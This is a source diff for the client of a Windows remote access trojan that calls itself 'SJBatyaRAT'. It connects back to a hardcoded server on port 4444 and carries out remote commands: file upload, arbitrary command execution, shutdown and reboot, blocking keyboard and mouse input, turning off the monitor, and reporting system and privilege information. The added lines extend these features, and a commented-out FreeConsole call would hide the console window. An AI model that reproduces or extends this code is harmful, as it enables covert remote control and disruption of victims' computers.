@@ -7,6 +7,9 @@
 #include <stdio.h>
 #include <string.h>
 #include <tchar.h>
+#include <chrono>
+#include <mmsystem.h>
+#pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "Ws2_32.lib")
 
 void ReceiveFile(SOCKET server)
@@ -91,8 +94,39 @@ void ExecuteCommand(const std::string& command)
     }
 }
 
+bool IsElevated()
+{
+    BOOL isElevated = FALSE;
+    HANDLE hToken = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+    {
+        TOKEN_ELEVATION elevation;
+        DWORD dwSize;
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
+        {
+            isElevated = (elevation.TokenIsElevated != 0);
+        }
+    }
+
+    if (hToken)
+    {
+        CloseHandle(hToken);
+    }
+
+    return (isElevated != FALSE);
+}
+
 int main(int argc, char* argv[])
 {
+    // FreeConsole();
+
+    // if (!IsElevated())
+    // {
+    //     MessageBox(NULL, "Run as admin!", "Fatal error", MB_OK | MB_ICONEXCLAMATION);
+    //     exit(1);
+    // }
+
     char* ip_addr = "192.168.31.135";
     int port = 4444;
 
@@ -113,24 +147,27 @@ int main(int argc, char* argv[])
     addr.sin_port = htons(4444); // port
     addr.sin_family = AF_INET; // IPv4
 
-    SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
-    if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
+    SOCKET s = socket(AF_INET, SOCK_STREAM, NULL);
+    if (connect(s, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
         printf("Failed to connect\n%d\n", WSAGetLastError());
         system("pause");
         exit(1);
     }
 
+    // debug
+    printf("");
+
     char buff[1024];
     while (true)
     {
-        int bytesReceived = recv(Connection, buff, sizeof(buff), 0);
+        int bytesReceived = recv(s, buff, sizeof(buff), 0);
         if (bytesReceived > 0) 
         {
             buff[bytesReceived] = '\0';
             std::string command(buff);
             if (command == "msgbox") {
                 std::string callback = "Message box was summoned!";
-                send(Connection, callback.c_str(), callback.size(), 0);
+                send(s, callback.c_str(), callback.size(), 0);
 
                 MessageBox(NULL, "U're hacked by SJBatyaRAT!", "SJBatyaRAT", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
             }
@@ -152,30 +189,84 @@ int main(int argc, char* argv[])
                 GetComputerNameA(computerName, &computerNameSize);
                 std::string computerNameStr(computerName, computerNameSize);
 
+                std::string elevated;
+                if (IsElevated()) 
+                    elevated = "Elevated: Running as Admin";
+                else 
+                    elevated = "Elevated: Running NOT as Admin";
+
+                char clientIP[INET_ADDRSTRLEN];
+                struct sockaddr_in addr_in;
+                int addrSize = sizeof(addr_in);
+                getpeername(s, (struct sockaddr*)&addr_in, &addrSize);
+                const char* clientIPStr = inet_ntop(AF_INET, &(addr_in.sin_addr), clientIP, INET_ADDRSTRLEN);
+                std::string clientIPInfo = "Client IP: " + std::string(clientIPStr);
+
                 std::string processor = "Processor: " + std::string("TODO: Retrieve processor information");
                 std::string username = "User: " + std::string("TODO: Retrieve username");
 
                 std::string output = systemInfo + "\n" + architecture + "\n" + "Name of Computer: " + computerNameStr + "\n" +
-                                    processor + "\n" + username;
-                
-                send(Connection, output.c_str(), output.size(), 0);
+                                    processor + "\n" + elevated + "\n" + username + "\n" + clientIPInfo;
+                            
+                send(s, output.c_str(), output.size(), 0);
             }
             else if (command.substr(0, 6) == "upload")
             {
                 std::string filePath = command.substr(7);
-                ReceiveFile(Connection);
+                ReceiveFile(s);
             }
             else if (command.substr(0, 7) == "execute")
             { 
                 std::string cmd = command.substr(8);
                 std::string output = cmd + " was executed!";
-                send(Connection, output.c_str(), output.size(), 0);
+                send(s, output.c_str(), output.size(), 0);
                 ExecuteCommand(cmd);
+            }
+            else if (command == "shutdown") {
+                std::string callback = "Victim's computer was turned off";
+                send(s, callback.c_str(), callback.size(), 0);
+                system("shutdown /s /t 0");
+            }
+            else if (command == "reboot") {
+                std::string callback = "Victim's computer was rebooted";
+                send(s, callback.c_str(), callback.size(), 0);
+                system("shutdown /r /t 0");
+            }
+            else if (command == "ping") {
+                // Измерение времени отклика и отправка обратно серверу
+                auto start = std::chrono::high_resolution_clock::now();
+                send(s, reinterpret_cast<char*>(&start), sizeof(start), 0);
+
+                // Ожидание получения запроса на время отклика и отправка обратно
+                std::chrono::high_resolution_clock::time_point end = std::chrono::high_resolution_clock::now();
+                send(s, reinterpret_cast<char*>(&end), sizeof(end), 0);
+            }
+            else if (command == "input on") {
+                BlockInput(FALSE);
+                std::string callback = "Input enabled";
+                send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command == "input off") {
+                BlockInput(TRUE);
+                std::string callback = "Input disabled";
+                send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command == "monitor on") {
+                HWND h = FindWindow(0, 0);
+                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
+                std::string callback = "Monitor was turned on";
+                send(s, callback.c_str(), callback.size(), 0);
+            }
+            else if (command == "monitor off") {
+                HWND h = FindWindow(0, 0);
+                SendMessage(h, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
+                std::string callback = "Monitor was turned off";
+                send(s, callback.c_str(), callback.size(), 0);
             }
 
             else if (command == "exit" || command == "quit" || command == "bye") {
                 std::string callback = "Client terminated...";
-                send(Connection, callback.c_str(), callback.size(), 0);
+                send(s, callback.c_str(), callback.size(), 0);
                 exit(0);
             }
         }
@@ -183,7 +274,7 @@ int main(int argc, char* argv[])
 
     Sleep(2000);  // Задержка на 2 секунды перед закрытием консоли
 
-    closesocket(Connection);
+    closesocket(s);
     WSACleanup();
     return 0;
 }
